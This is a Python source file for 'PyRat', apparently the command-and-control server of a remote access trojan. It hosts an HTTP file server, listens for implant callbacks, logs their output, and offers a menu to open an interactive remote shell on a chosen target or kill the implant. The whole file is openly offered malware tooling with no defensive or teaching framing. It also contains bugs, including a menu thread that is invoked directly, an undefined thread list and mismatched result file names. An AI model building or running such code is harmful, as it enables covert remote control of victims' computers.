import os
import sys
import socket
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler

class Server:
    def __init__(self,ADDR,PORT,WEB_PORT=8000):
        logfile = open("./connection-log",'a')
        sys.stderr = logfile

        self.ADDR = ADDR
        self.PORT = PORT
        self.WEB_PORT = WEB_PORT
        threads = []

        web_thread = Thread(target=self.web_task,args=(self.ADDR,self.WEB_PORT))
        threads.append(web_thread)
        web_thread.start()

        server_thread = Thread(target=self.server_listen,args=(self.ADDR,self.PORT))
        threads.append(server_thread)
        server_thread.start()

        menu_thread = Thread(target=self.menu())
        threads.append(menu_thread)
        menu_thread.start()



    def __del__(self):
        for t in self.threads:
            t.join()
          
    def menu (self):
        print("-- SERVER INFORMATION-- :")
        print(f"[+] SERVER IP: {self.ADDR}")
        print(f"[+] SERVER PORT: {self.PORT}")
        print(f"[+] SERVER WEB PORT: {self.WEB_PORT}")
        print("-------------------------------------")
        
        while True:
            print("PyRat Options: \n1. Connect to Shell\n2. Kill Remote Implant\n\n3. Exit Server\n")
            opt = input("Choose your option: ")
            if opt == '1':
                self.implant_task_socket("TASK")
            elif opt == '2':
                self.implant_task_socket("KILL")
            elif opt == '3':
                die = input(f"Would you like to kill a client(Y/N): ")
                if die[0].upper() == "Y":
                    self.implant_task_socket("KILL")
                    os.kill(os.getpid(),9)
                else:
                    os.kill(os.getpid(),9)          

    def web_task(self, HOST,WEB_PORT=8000):
        http_socket = HTTPServer((HOST,WEB_PORT),SimpleHTTPRequestHandler)
        http_socket.serve_forever()

    def implant_task_socket(self, OPTION="TASK"):
        print("Enter the target address: ")
        addr = input("")
        print("Enter the target port: ")
        port = int(input(""))
        print(f"Connecting to {addr}:{port}")
        
        cmd = ""
        CLIENT = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        CLIENT.connect((addr,port))
        if OPTION == "TASK":
            CLIENT.send(b"TASK")
            print(CLIENT.recv(1024).decode())
            
            while cmd.upper() != "QUIT":
                cmd = input("<-- ")
                CLIENT.send(cmd.encode())
                print(CLIENT.recv(1024).decode())
                CLIENT.send(b"TASK")
                print(CLIENT.recv(1024).decode())
            CLIENT.close()
        elif OPTION == "KILL":
            CLIENT.send(b"KILL")
            print(CLIENT.recv(1024).decode())


    def server_listen(self,HOST,PORT):
        SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        SERVER.bind((HOST,PORT))
        SERVER.listen()
        while True:
            client,client_addr = SERVER.accept()
            if os.path.exists("task-completed.txt"):
                FH_RESULTS = open("task-completed.txt",'a')
            else:
                FH_RESULTS = open("task-completed",'w')
            msg = client.recv(1024)
            FH_RESULTS.write(msg.decode())
            FH_RESULTS.close()

